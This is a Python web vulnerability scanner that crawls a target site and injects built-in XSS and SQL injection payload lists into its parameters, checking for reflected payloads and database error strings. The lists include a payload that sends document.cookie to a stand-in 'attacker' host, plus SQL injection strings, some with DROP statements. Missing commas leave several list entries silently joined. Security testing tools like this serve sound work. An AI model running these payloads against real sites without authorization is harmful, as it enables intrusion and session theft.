#!/usr/bin/env python3
from __future__ import print_function
import argparse
import os
import re
import sys
import time
import json
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote_plus, urljoin
from html.parser import HTMLParser
import concurrent.futures
import threading

try:
    import requests
except Exception:
    print("Please install 'requests' library: pip install requests")
    sys.exit(1)

# ---------- Config ----------
USER_AGENT = "Ordered-Scanner/AutoResult/1.0"
REQUEST_TIMEOUT = 12
CRAWL_ENABLED = True
CRAWL_PAGES = 8
MAX_SQLI = None
MAX_XSS = None
THREADS = 4
REQUEST_DELAY = 0.0  # seconds between requests across threads (throttle)

# internal throttle state
_last_request_time = 0.0
_last_request_lock = threading.Lock()
_print_lock = threading.Lock()

# Official data sources
NVD_API_BASE = "https://api.nvd.nist.gov/rest/json/cves/2"
MITRE_CWE_JSON_URL = "https://cwe.mitre.org/data/json/cwe.json"

# Built-in payloads (editable)
XSS_PAYLOADS = [
    "</title><svg/onload=confirm(1)>",
    "<script>confirm(1)</script>",
    "\"/><img src=x onerror=alert(1)>",
    "<svg><script>alert(1)</script>",
    "<body onload=alert('xss')>",
    "</tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s",
    "<A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s"
       "<img src=1 onerror=confirm('xss')>",
    "<iframe src=\"javascript:confirm(1)\"></iframe>",
    "<svg onload=alert`1`>",
    "'\"><svg/onload=alert(1)>",
    "\"><script>new Image().src='//attacker/?c='+document.cookie</script>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>Open</details>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<object data=\"javascript:alert(1)\"></object>",
     "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",  # alert hex-encoded
    "<img src=x onerror=javascript:confirm%281%29>",
    "<img src=\"x\" onerror=\"/*\n*/alert(1)\">",
     "<video><source onerror=alert(1)></video>",
    "<math><mi onmouseover=alert(1)>X</mi></math>",
    "' onmouseover=alert(1) x='",
    "\"><svg><g onload=alert(1)></g></svg>",
    "</textarea><script>alert('xss')</script>",
    "<a href=\"javascript:/*\n*/alert(1)\">click</a>",
    "<a href='javas&#99;ript:alert(1)'>x</a>",
     "<svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>",
    "<form action=javascript:alert(1)><input type=submit></form>",
    "<img src=x onerror=eval('con'+'firm(1)')>",
    "<script>setTimeout(()=>alert(1),0)</script>",
    "%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e",
    "<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
    "<textarea><script>alert('XSS')</script></textarea>",
    "<form><button formaction=\"javascript:alert('XSS')\">Click me</button></form>",
    "<form><input type=\"hidden\" name=\"xss\" value=\"<script>alert('XSS')</script>\"></form>",
    "<input type=\"text\" onfocus=\"alert('XSS')\" value=\"Focus me\">",
    "<input type=\"button\" value=\"Click me\" onclick=\"alert('XSS')\">",
    "<form action=\"https://example.com/post\" method=\"POST\"><input type=\"text\" value=\"<script>alert('XSS')</script>\"></form>",
    "<input type=\"text\" value='\"><script>alert(1)</script>'>",
    "<input type=\"text\" value='\"><img src=x onerror=alert(1)>'>",
    "<form><input name=\"xss\" value=\"<img src=x onerror=alert('XSS')>\"></form>"
        "<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
    "<textarea><script>alert('XSS')</script></textarea>",
    "<form><button formaction=\"javascript:alert('XSS')\">Click me</button></form>",
    "<form><input type=\"hidden\" name=\"xss\" value=\"<script>alert('XSS')</script>\"></form>",
    "<input type=\"text\" onfocus=\"alert('XSS')\" value=\"Focus me\">",
    "<input type=\"button\" value=\"Click me\" onclick=\"alert('XSS')\">",
    "<form action=\"https://example.com/post\" method=\"POST\"><input type=\"text\" value=\"<script>alert('XSS')</script>\"></form>",
    "<input type=\"text\" value='\"><script>alert(1)</script>'>",
    "<input type=\"text\" value='\"><img src=x onerror=alert(1)>'>",
    "<form><input name=\"xss\" value=\"<img src=x onerror=alert('XSS')>\"></form>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1\" -- ",
    "' UNION SELECT NULL--",
    "' OR sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' OR 'a'='a'--",
   " 1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",

    "1' ORDER BY 1,2--+",
   " 1' ORDER BY 1,2,3--+",

   " 1' GROUP BY 1,2,--+",
    "1' GROUP BY 1,2,3--+",
   " ' GROUP BY columnnames having 1=1 --",
   "/**8**/and/**8**/0/**8**//*!50000UniOn*//**8**//*!50000select*//**8**/",
   "%20and%200+/**8**//*!50000UniON*/%20/*!50000sEleCt*/%20",
    "OR 1=1"
 "OR 1=0",
 "OR x=x",
 "OR x=y",
" OR 1=1#",
 "OR 1=0#",
 "OR x=x#",
 "OR x=y#",
 "OR 1=1-- ",
 "OR 1=0-- ",
 "OR x=x-- ",
 "OR x=y-- " ,
 "OR 3409=3409 AND ('pytW' LIKE 'pytW",
 "OR 3409=3409 AND ('pytW' LIKE 'pytY",
 "HAVING 1=1",
 "HAVING 1=0",
 "HAVING 1=1#",
 "HAVING 1=0#",
 "HAVING 1=1-- ",
 "HAVING 1=0-- ",
 "AND 1=1",
 "AND 1=0",
 "AND 1=1-- " ,
 "AND 1=0-- ",
 "AND 1=1#",
 "AND 1=0#",
 "AND 1=1 AND '%'=' ",
 "AND 1=0 AND '%'=' ",
 "AND 1083=1083 AND (1427=1427",
 "AND 7506=9091 AND (5913=5913",
 "AND 1083=1083 AND ('1427=1427",
 "AND 7506=9091 AND ('5913=5913",
 "AND 7300=7300 AND 'pKlZ'='pKlZ",
 "AND 7300=7300 AND 'pKlZ'='pKlY",
 "AND 7300=7300 AND ('pKlZ'='pKlZ",
 "AND 7300=7300 AND ('pKlZ'='pKlY",
 "AS INJECTX WHERE 1=1 AND 1=1",
 "AS INJECTX WHERE 1=1 AND 1=0",
 "AS INJECTX WHERE 1=1 AND 1=1#",
 "AS INJECTX WHERE 1=1 AND 1=0#",
 "AS INJECTX WHERE 1=1 AND 1=1-- ",
 "WHERE 1=1 AND 1=1",
 "WHERE 1=1 AND 1=0",
 "WHERE 1=1 AND 1=1#",
" WHERE 1=1 AND 1=0#",
 "WHERE 1=1 AND 1=1--",
 "WHERE 1=1 AND 1=0--",
 "ORDER BY 1-- ",
 "ORDER BY 2-- ",
 "ORDER BY 3-- ",
 "ORDER BY 4-- ",
 "ORDER BY 5-- ",
 "ORDER BY 6-- ",
 "ORDER BY 7-- ",
 "ORDER BY 8-- ",
 "ORDER BY 9-- ",
 "ORDER BY 10-- ",
 "ORDER BY 11-- ",
 "ORDER BY 12-- ",
 "ORDER BY 13-- ",
 "ORDER BY 14-- ",
 "ORDER BY 15-- ",
 "ORDER BY 16-- ",
 "ORDER BY 17-- ",
 "ORDER BY 18-- ",
 "ORDER BY 19-- ",
" ORDER BY 20-- ",
 "ORDER BY 21-- ",
 "ORDER BY 22-- ",
 "ORDER BY 23-- ",
 "ORDER BY 24-- ",
 "ORDER BY 25-- ",
 "ORDER BY 26-- ",
 "ORDER BY 27-- ",
 "ORDER BY 28-- ",
 "ORDER BY 29-- ",
 "ORDER BY 30-- ",
 "ORDER BY 31337-- ",
" ORDER BY 1# ",
 "ORDER BY 2# ",
 "ORDER BY 3# ",
 "ORDER BY 4# ",
 "ORDER BY 5# ",
" ORDER BY 6# ",
 "ORDER BY 7# ",
 "ORDER BY 8# ",
" RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' ",
" RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' ",
"IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
"IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
"%' AND 8310=8310 AND '%'=' ",
"%' AND 8310=8311 AND '%'=' ",
" and (select substring(@@version,1,1))='X' ",
" and (select substring(@@version,1,1))='M' ",
 "and (select substring(@@version,2,1))='i' ",
" and (select substring(@@version,2,1))='y'",
" and (select substring(@@version,3,1))='c'",
 "and (select substring(@@version,3,1))='S'",
 "and (select substring(@@version,3,1))='X'",
]

SQL_ERROR_SIGNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "unclosed quotation mark after the character string",
    "syntax error at or near",
    "ora-",
    "pg::syntaxerror",
    "sqlstate",
    "native client error",
]



# ASCII banner printed at runtime
BANNER = r"""
             (       ) (   (               
             )\ ) ( /( )\ ))\ )  *   )     
 (   (    ( (()/( )\()|()/(()/(` )  /((    
 )\  )\   )\ /()|()\ /())())( )(_))\   
(()(() ((|))  ((|))()) ((()|(_)  
\ \ / / | | | |  | \| / _| ||   | _| 
 \ V /| || | || .` \_ \| |   | | | _|  
  \/  \_/|_||\|_/_|  || |__| 
                                           
   Mr.Chainner                 v1.1     
   MR.R                                       
"""
# ---------- Colors ----------
class C:
    RED = '\033[91m'
    ORANGE = '\033[93m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    BOLD = '\033[1m'
    END = '\033[0m'

def color(s, col=''):
    if not col: return s
    return col + s + C.END
# ---------- Helpers ----------
def sanitize_url(u):
    p = urlparse(u)
    return urlunparse(p._replace(fragment=''))

def host_filename_from_url(u):
    p = urlparse(u)
    host = p.netloc
    host = host.replace(':','_')
    fname = f"{host}.txt"
    return fname

def ensure_result_path():
    res_dir = os.path.join(os.getcwd(), "result")
    os.makedirs(res_dir, exist_ok=True)
    return res_dir

def output_path_for_target(u):
    res_dir = ensure_result_path()
    fname = host_filename_from_url(u)
    return os.path.join(res_dir, fname)

def append_output_file(path, text):
    try:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(text + "\n")
    except Exception as e:
        print(color(f"[!] Warning: could not write to output file: {e}", C.RED))

def print_and_log(path, text, col=''):
    # thread-safe printing + logging
    with _print_lock:
        if col:
            print(color(text, col), flush=True)
        else:
            print(text, flush=True)
        append_output_file(path, re.sub(r'\x1b\[[0-9;]*m', '', text))

def build_test_url(base_url, param_pairs, target_param, payload):
    new_q = []
    for k, v in param_pairs:
        if k == target_param:
            new_q.append((k, payload))
        else:
            new_q.append((k, v))
    # if the target_param wasn't present in param_pairs (discovered via crawling), add it
    if not any(k == target_param for k, _ in new_q):
        new_q.append((target_param, payload))
    parsed = urlparse(base_url)
    return urlunparse(parsed._replace(query=urlencode(new_q, doseq=True)))

def safe_get(url):
    return _throttled_get(url)


def _throttled_get(url, timeout=None):
    """Thread-safe throttled GET respecting REQUEST_DELAY between requests."""
    global _last_request_time
    timeout = REQUEST_TIMEOUT if timeout is None else timeout
    with _last_request_lock:
        now = time.time()
        wait = REQUEST_DELAY - (now - _last_request_time)
        if wait > 0:
            time.sleep(wait)
        _last_request_time = time.time()
    headers = {'User-Agent': USER_AGENT}
    try:
        r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
        return r
    except Exception:
        return None

# ---------- Simple crawler ----------
class _FormAndLinkParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base = base_url
        self.forms = []
        self.links = set()
        self._current_form = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == 'a' and 'href' in a:
            href = a['href']
            full = urljoin(self.base, href)
            self.links.add(full)
        elif tag == 'form':
            action = a.get('action', self.base)
            method = a.get('method', 'get').lower()
            self._current_form = {'action': urljoin(self.base, action), 'method': method, 'inputs': []}
        elif tag in ('input', 'textarea', 'select') and self._current_form is not None:
            name = a.get('name')
            if name:
                self._current_form['inputs'].append(name)

    def handle_endtag(self, tag):
        if tag == 'form' and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


def crawl_collect_params(start_url, max_pages=20):
    parsed = urlparse(start_url)
    base_netloc = parsed.netloc
    to_visit = [start_url]
    visited = set()
    params = {}
    pages = []
    # breadth-first crawl but fetch pages concurrently in batches
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        while to_visit and len(visited) < max_pages:
            batch = []
            while to_visit and len(batch) < THREADS and len(visited) + len(batch) < max_pages:
                u = to_visit.pop(0)
                if u in visited:
                    continue
                batch.append(u)
            if not batch:
                break
            # schedule fetches
            future_to_url = {executor.submit(_throttled_get, u): u for u in batch}
            new_links = []
            for fut in concurrent.futures.as_completed(future_to_url):
                u = future_to_url[fut]
                try:
                    resp = fut.result()
                except Exception:
                    resp = None
                visited.add(u)
                pages.append(u)
                if resp is None:
                    continue
                txt = resp.text
                p = urlparse(u)
                qpairs = parse_qsl(p.query, keep_blank_values=True)
                pset = set(k for k, v in qpairs)
                parser = _FormAndLinkParser(u)
                try:
                    parser.feed(txt)
                except Exception:
                    pass
                for f in parser.forms:
                    for n in f.get('inputs', []):
                        pset.add(n)
                if pset:
                    params[u] = pset
                for link in parser.links:
                    lp = urlparse(link)
                    if lp.netloc == base_netloc and link not in visited and link not in to_visit and link not in new_links:
                        new_links.append(link)
            # append discovered links to to_visit (breadth-first)
            to_visit.extend(new_links)
    merged = {}
    for url, pset in params.items():
        host = urlparse(url).netloc
        merged.setdefault(host, set()).update(pset)
    return merged, pages

# ---------- New: robots.txt and crawl checks ----------
def fetch_robots_txt(start_url):
    try:
        parsed = urlparse(start_url)
        robots_url = urlunparse(parsed._replace(path='/robots.txt', params='', query='', fragment=''))
        r = requests.get(robots_url, headers={'User-Agent': USER_AGENT}, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            return r.text
    except Exception:
        pass
    return ''

def robots_allows_path(robots_text, path, user_agent='*'):
    if not robots_text:
        return True
    lines = [l.strip() for l in robots_text.splitlines() if l.strip() and not l.strip().startswith('#')]
    ua = None
    disallows = []
    for l in lines:
        if l.lower().startswith('user-agent:'):
            ua = l.split(':',1)[1].strip()
        elif l.lower().startswith('disallow:') and ua is not None:
            val = l.split(':',1)[1].strip()
            if val:
                disallows.append((ua, val))
    for (u, p) in disallows:
        if u == user_agent or u == '*':
            if path.startswith(p):
                return False
    return True

def is_html_response(resp):
    if not resp:
        return False
    ctype = resp.headers.get('Content-Type','').lower()
    return resp.status_code == 200 and ('text/html' in ctype or 'application/xhtml+xml' in ctype)

# ---------- CVE (NVD) and CWE (MITRE) helpers ----------
# Caching to limit duplicate network calls
_NVD_CACHE = {}
_MITRE_CWE_CACHE = None

def severity_from_score(score):
    try:
        s = float(score)
    except Exception:
        return None
    if s >= 9.0:
        return 'Critical'
    if s >= 7.0:
        return 'High'
    if s >= 4.0:
        return 'Medium'
    if s > 0.0:
        return 'Low'
    return 'None'

def query_nvd_cve(cve_id, timeout=10):
    """Query official NVD API for a given CVE identifier. Returns dict with 'valid', 'cvss', 'summary', 'cwe_refs'."""
    if not cve_id:
        return {'valid': False}
    cve_id = cve_id.upper()
    if cve_id in _NVD_CACHE:
        return _NVD_CACHE[cve_id]
    params = {'cveId': cve_id}
    try:
        r = requests.get(NVD_API_BASE, params=params, headers={'User-Agent': USER_AGENT}, timeout=timeout)
        if r.status_code != 200:
            _NVD_CACHE[cve_id] = {'valid': False}
            return _NVD_CACHE[cve_id]
        j = r.json()
    except Exception:
        _NVD_CACHE[cve_id] = {'valid': False}
        return _NVD_CACHE[cve_id]
    # parse response (v2 structure)
    items = j.get('vulnerabilities') or []
    if not items:
        _NVD_CACHE[cve_id] = {'valid': False}
        return _NVD_CACHE[cve_id]
    # find matching cve
    first = items[0].get('cve') or {}
    # extract summary
    desc = ''
    descriptions = first.get('descriptions') or []
    for d in descriptions:
        if d.get('lang','').lower().startswith('en'):
            desc = d.get('value','')
            break
    # extract cvss score if present
    cvss_score = None
    metrics = first.get('metrics') or {}
    for key in ('cvssMetricV31','cvssMetricV3','cvssV3'):
        arr = metrics.get(key)
        if arr and isinstance(arr, list) and len(arr) > 0:
            firstm = arr[0]
            cvssData = firstm.get('cvssData') or firstm.get('cvss') or {}
            if isinstance(cvssData, dict):
                cvss_score = cvssData.get('baseScore') or cvssData.get('base_score')
                try:
                    cvss_score = float(cvss_score) if cvss_score is not None else None
                except Exception:
                    cvss_score = None
            if cvss_score is not None:
                break
    # extract CWE references (if any)
    cwe_refs = []
    weaknesses = first.get('weaknesses') or []
    for w in weaknesses:
        descs = w.get('description') or []
        for d in descs:
            if d.get('lang','').lower().startswith('en'):
                # try to capture CWE-XXXX patterns
                found = re.findall(r"CWE-\d+", d.get('value',''))
                for f in found:
                    if f not in cwe_refs:
                        cwe_refs.append(f)
    result = {'valid': True, 'cvss': cvss_score, 'summary': desc, 'cwe_refs': cwe_refs}
    _NVD_CACHE[cve_id] = result
    return result


def fetch_mitre_cwe(timeout=10):
    """Download MITRE CWE JSON index and cache it locally in memory."""
    global _MITRE_CWE_CACHE
    if _MITRE_CWE_CACHE is not None:
        return _MITRE_CWE_CACHE
    try:
        r = requests.get(MITRE_CWE_JSON_URL, headers={'User-Agent': USER_AGENT}, timeout=timeout)
        if r.status_code != 200:
            _MITRE_CWE_CACHE = {}
            return _MITRE_CWE_CACHE
        j = r.json()
    except Exception:
        _MITRE_CWE_CACHE = {}
        return _MITRE_CWE_CACHE
    # The MITRE structure contains a 'cwe' or 'Weaknesses' section - try a few keys
    mapping = {}
    # support both direct mapping and nested lists
    # attempt common shapes
    if isinstance(j, dict):
        # look for 'Weaknesses' or 'cwe' keys
        for key in ('Weaknesses','cwe','Weakness'):
            sec = j.get(key)
            if isinstance(sec, list):
                for item in sec:
                    cid = item.get('ID') or item.get('id') or item.get('id')
                    name = item.get('Name') or item.get('name') or item.get('Title') or item.get('description')
                    desc = item.get('Description') or item.get('description') or ''
                    if cid:
                        mapping[str(cid).upper()] = {'name': name, 'description': desc}
                break
        # fallback: try to walk recursively for entries containing 'id' and 'name'
        if not mapping:
            def walk(obj):
                if isinstance(obj, dict):
                    if 'ID' in obj and ('Name' in obj or 'Name' in obj):
                        mapping[str(obj.get('ID')).upper()] = {'name': obj.get('Name'), 'description': obj.get('Description','')}
                    for v in obj.values():
                        walk(v)
                elif isinstance(obj, list):
                    for i in obj:
                        walk(i)
            walk(j)
    _MITRE_CWE_CACHE = mapping
    return _MITRE_CWE_CACHE


def validate_cwe(cwe_id):
    """Check MITRE CWE JSON for the given CWE identifier 'CWE-123'. Returns dict {'valid', 'name', 'description'}"""
    if not cwe_id:
        return {'valid': False}
    # normalize
    m = re.match(r"CWE-(\d+)", cwe_id, flags=re.IGNORECASE)
    if not m:
        return {'valid': False}
    numeric = m.group(1)
    mapping = fetch_mitre_cwe()
    # MITRE keys in our mapping may be numeric or 'CWE-###'
    for key, info in mapping.items():
        if key.upper() == cwe_id.upper() or key.endswith(numeric):
            return {'valid': True, 'name': info.get('name'), 'description': info.get('description')}
    return {'valid': False}

# Utility: extract CVE and CWE tokens from text
def extract_cves(text):
    if not text:
        return []
    matches = re.findall(r"CVE-\d{4}-\d{4,7}", text, flags=re.IGNORECASE)
    uniques = []
    for m in matches:
        mm = m.upper()
        if mm not in uniques:
            uniques.append(mm)
    return uniques

def extract_cwes(text):
    if not text:
        return []
    matches = re.findall(r"CWE-\d{1,7}", text, flags=re.IGNORECASE)
    uniques = []
    for m in matches:
        mm = m.upper()
        if mm not in uniques:
            uniques.append(mm)
    return uniques

# ---------- Simple XSS/SQLi inspection helpers ----------
def inspect_xss(resp_text, payload):
    if not resp_text:
        return False, None
    if payload in resp_text:
        idx = resp_text.find(payload)
        snippet = resp_text[max(0, idx-60): idx + len(payload) + 60].replace('\n',' ')
        return True, snippet
    enc = quote_plus(payload)
    if enc in resp_text:
        idx = resp_text.find(enc)
        snippet = resp_text[max(0, idx-60): idx + len(enc) + 60].replace('\n',' ')
        return True, snippet
    return False, None


def inspect_sqli(resp_text):
    if not resp_text:
        return None
    low = resp_text.lower()
    for sig in SQL_ERROR_SIGNS:
        if sig in low:
            idx = low.find(sig)
            snippet = resp_text[max(0, idx-80): idx + len(sig) + 80].replace('\n',' ')
            return sig, snippet, None
    return None

# ---------- Main scan logic with CVE/CWE validation ----------
def scan_ordered(target_url):
    target_url = sanitize_url(target_url)
    outpath = output_path_for_target(target_url)
    try:
        with open(outpath, 'w', encoding='utf-8') as fh:
            fh.write("=== Web Security Scan Report ===\n")
            fh.write(f"Target: {target_url}\n")
            fh.write(f"Start Time: {time.ctime()}\n\n")
    except Exception as e:
        print(color(f"[!] Fatal: cannot create output file {outpath}: {e}", C.RED))
        sys.exit(1)

    print_and_log(outpath, f"[~] Starting scan on target: {target_url}", C.BOLD)

    p = urlparse(target_url)
    pairs = parse_qsl(p.query, keep_blank_values=True)
    param_names = []
    for k, v in pairs:
        if k not in param_names:
            param_names.append(k)

    # Crawl and collect params (if enabled)
    try:
        if CRAWL_ENABLED:
            merged_params, pages = crawl_collect_params(target_url, max_pages=CRAWL_PAGES)
        else:
            merged_params, pages = ({}, [])
        host_params = merged_params.get(p.netloc, set())
        for k in host_params:
            if k not in param_names:
                param_names.append(k)
        if host_params:
            print_and_log(outpath, f"[~] Collected parameters from crawl: {', '.join(sorted(host_params))}", C.BLUE)
    except Exception:
        pages = []

    if not param_names:
        msg = "[!] No query parameters or form inputs found on target. Nothing to test."
        print_and_log(outpath, msg, C.ORANGE)
        return

    # ---- verify crawling allowed and functional before running XSS ----
    robots_txt = fetch_robots_txt(target_url)
    path = urlparse(target_url).path or '/'
    robots_ok = robots_allows_path(robots_txt, path, user_agent='*')
    if not robots_ok:
        print_and_log(outpath, f"[!] robots.txt disallows crawling of path {path}. Skipping XSS phase.", C.ORANGE)
        can_run_xss = False
    else:
        html_ok = False
        checked = 0
        for u in pages[:max(1, CRAWL_PAGES)]:
            resp = safe_get(u)
            checked += 1
            if is_html_response(resp):
                html_ok = True
                break
            if checked >= 3:
                break
        if not html_ok:
            print_and_log(outpath, "[!] Crawling did not yield reachable HTML pages (200 + text/html). Skipping XSS phase.", C.ORANGE)
        can_run_xss = html_ok

    print_and_log(outpath, f"[~] Found parameters: {', '.join(param_names)}", C.BLUE)

    overall_xss = []
    overall_sqli = []
    start = time.time()

    # Perform XSS phase across all discovered parameters AFTER crawling completes
    if can_run_xss:
        xss_list = XSS_PAYLOADS[:MAX_XSS] if MAX_XSS else XSS_PAYLOADS
        print_and_log(outpath, f"[~] Phase: XSS (testing {len(xss_list)} payloads across {len(param_names)} parameters)", C.BLUE)
        for param in param_names:
            param_pairs = pairs
            for idx, payload in enumerate(xss_list, 1):
                test_url = build_test_url(target_url, param_pairs, param, payload)
                print_and_log(outpath, f"[XSS] ({idx}/{len(xss_list)}) Testing payload on {param}: {payload}", None)
                resp = safe_get(test_url)
                if resp is None:
                    print_and_log(outpath, f"[XSS] ({idx}) No response (network error/timeout).", C.ORANGE)
                    continue
                ok, snippet = inspect_xss(resp.text, payload)
                if ok:
                    # extract CVEs/CWEs from response/snippet and validate
                    cves = extract_cves(resp.text) + extract_cves(snippet)
                    cves = list(dict.fromkeys([c.upper() for c in cves]))
                    cwes = extract_cwes(resp.text) + extract_cwes(snippet)
                    cwes = list(dict.fromkeys([c.upper() for c in cwes]))

                    validated_cves = []
                    for cid in cves:
                        info = query_nvd_cve(cid)
                        if info.get('valid'):
                            sev = severity_from_score(info.get('cvss')) if info.get('cvss') is not None else 'Unknown'
                            validated_cves.append({'cve': cid, 'cvss': info.get('cvss'), 'severity': sev, 'summary': info.get('summary'), 'cwe_refs': info.get('cwe_refs')})
                        else:
                            validated_cves.append({'cve': cid, 'valid': False})

                    validated_cwes = []
                    for wid in cwes:
                        winfo = validate_cwe(wid)
                        if winfo.get('valid'):
                            validated_cwes.append({'cwe': wid, 'name': winfo.get('name'), 'description': winfo.get('description')})
                        else:
                            validated_cwes.append({'cwe': wid, 'valid': False})

                    rec = {'param': param, 'payload': payload, 'test_url': test_url, 'evidence': snippet, 'cves': validated_cves, 'cwes': validated_cwes}
                    overall_xss.append(rec)
                    print_and_log(outpath, f"[++] XSS reflection detected on {param}", C.ORANGE)
                    print_and_log(outpath, f"    Evidence: {snippet[:300]}", C.ORANGE)
                    if validated_cves:
                        for v in validated_cves:
                            if v.get('valid') is False:
                                print_and_log(outpath, f"    CVE: {v.get('cve')} (NOT FOUND in NVD)", C.RED)
                            else:
                                sevcol = C.RED if v.get('severity') in ('Critical','High') else (C.ORANGE if v.get('severity')=='Medium' else C.BLUE)
                                print_and_log(outpath, f"    CVE: {v.get('cve')}  CVSS: {v.get('cvss')}  Severity: {v.get('severity')}", sevcol)
                                if v.get('summary'):
                                    print_and_log(outpath, f"      Summary: {v.get('summary')[:200]}")
                                if v.get('cwe_refs'):
                                    print_and_log(outpath, f"      NVD CWE refs: {', '.join(v.get('cwe_refs'))}")
                    if validated_cwes:
                        for w in validated_cwes:
                            if w.get('valid') is False:
                                print_and_log(outpath, f"    CWE: {w.get('cwe')} (NOT FOUND in MITRE)", C.RED)
                            else:
                                print_and_log(outpath, f"    CWE: {w.get('cwe')} - {w.get('name')}")
                                if w.get('description'):
                                    print_and_log(outpath, f"      Desc: {w.get('description')[:200]}")
                else:
                    print_and_log(outpath, f"[XSS] ({idx}) No reflection detected.", None)
    else:
        print_and_log(outpath, "[~] Skipping XSS phase because crawling check failed or robots.txt forbids crawling.", C.ORANGE)

    # SQLi phase (always run across all discovered parameters)
    sqli_list = SQLI_PAYLOADS[:MAX_SQLI] if MAX_SQLI else SQLI_PAYLOADS
    for param in param_names:
        param_pairs = pairs
        print_and_log(outpath, f"\n[~] Testing parameter '{param}'", C.BOLD)
        print_and_log(outpath, f"[~] Proceeding to SQLi phase (testing {len(sqli_list)} payloads) for '{param}'.", C.BLUE)
        for idx, payload in enumerate(sqli_list, 1):
            test_url = build_test_url(target_url, param_pairs, param, payload)
            print_and_log(outpath, f"[SQLi] ({idx}/{len(sqli_list)}) Testing payload on {param}: {payload}", None)
            t0 = time.time()
            resp = safe_get(test_url)
            if resp is None:
                print_and_log(outpath, f"[SQLi] ({idx}) No response (network error/timeout).", C.ORANGE)
                continue
            latency = time.time() - t0
            sig = inspect_sqli(resp.text)
            if sig:
                signature, evidence, inferred_db = sig
                # extract CVE/CWE tokens and validate
                cves = extract_cves(resp.text) + extract_cves(evidence)
                cves = list(dict.fromkeys([c.upper() for c in cves]))
                cwes = extract_cwes(resp.text) + extract_cwes(evidence)
                cwes = list(dict.fromkeys([c.upper() for c in cwes]))

                validated_cves = []
                for cid in cves:
                    info = query_nvd_cve(cid)
                    if info.get('valid'):
                        sev = severity_from_score(info.get('cvss')) if info.get('cvss') is not None else 'Unknown'
                        validated_cves.append({'cve': cid, 'cvss': info.get('cvss'), 'severity': sev, 'summary': info.get('summary'), 'cwe_refs': info.get('cwe_refs')})
                    else:
                        validated_cves.append({'cve': cid, 'valid': False})

                validated_cwes = []
                for wid in cwes:
                    winfo = validate_cwe(wid)
                    if winfo.get('valid'):
                        validated_cwes.append({'cwe': wid, 'name': winfo.get('name'), 'description': winfo.get('description')})
                    else:
                        validated_cwes.append({'cwe': wid, 'valid': False})

                rec = {'param': param, 'payload': payload, 'test_url': test_url, 'signature': signature, 'evidence': evidence, 'cves': validated_cves, 'cwes': validated_cwes}
                overall_sqli.append(rec)
                print_and_log(outpath, f"[++] SQLi indicator detected on {target_url}", C.RED)
                print_and_log(outpath, f"    Parameter: {param}", C.RED)
                print_and_log(outpath, f"    Payload: {payload}", C.RED)
                if inferred_db:
                    print_and_log(outpath, f"[SQLi] database (inferred): {inferred_db}", C.RED)
                print_and_log(outpath, f"    Matched signature: \"{signature}\"", C.RED)
                print_and_log(outpath, f"    Evidence: {evidence[:300]}", C.RED)
                # print validated CVEs/CWEs
                if validated_cves:
                    for v in validated_cves:
                        if v.get('valid') is False:
                            print_and_log(outpath, f"    CVE: {v.get('cve')} (NOT FOUND in NVD)", C.RED)
                        else:
                            sevcol = C.RED if v.get('severity') in ('Critical','High') else (C.ORANGE if v.get('severity')=='Medium' else C.BLUE)
                            print_and_log(outpath, f"    CVE: {v.get('cve')}  CVSS: {v.get('cvss')}  Severity: {v.get('severity')}", sevcol)
                            if v.get('summary'):
                                print_and_log(outpath, f"      Summary: {v.get('summary')[:200]}")
                            if v.get('cwe_refs'):
                                print_and_log(outpath, f"      NVD CWE refs: {', '.join(v.get('cwe_refs'))}")
                if validated_cwes:
                    for w in validated_cwes:
                        if w.get('valid') is False:
                            print_and_log(outpath, f"    CWE: {w.get('cwe')} (NOT FOUND in MITRE)", C.RED)
                        else:
                            print_and_log(outpath, f"    CWE: {w.get('cwe')} - {w.get('name')}")
                            if w.get('description'):
                                print_and_log(outpath, f"      Desc: {w.get('description')[:200]}")
                # suggested manual verify (do not run automatically)
                sqlmap_cmd = f"sqlmap -u \"{target_url}\" -p {param} --batch --level=2 --risk=1"
                print_and_log(outpath, f"    Suggested manual verify command: {sqlmap_cmd}", C.ORANGE)
            else:
                print_and_log(outpath, f"[SQLi] ({idx}) No SQL error signature detected (resp_time={latency:.2f}s).", None)

    duration = time.time() - start
    print_and_log(outpath, "\n====== SCAN STATISTICS ======", C.BOLD)
    print_and_log(outpath, f"Target: {target_url}")
    print_and_log(outpath, f"Total parameters tested: {len(param_names)}")
    print_and_log(outpath, f"XSS findings: {len(overall_xss)}")
    print_and_log(outpath, f"SQLi indicators: {len(overall_sqli)}")
    print_and_log(outpath, f"Duration (s): {duration:.2f}")
    print_and_log(outpath, f"Scan finished: {time.ctime()}", C.BOLD)

    print(color("\nScan finished. Summary:", C.BOLD))
    print(f"  Parameters tested: {len(param_names)}")
    print(f"  XSS findings: {len(overall_xss)} (details appended to result file)")
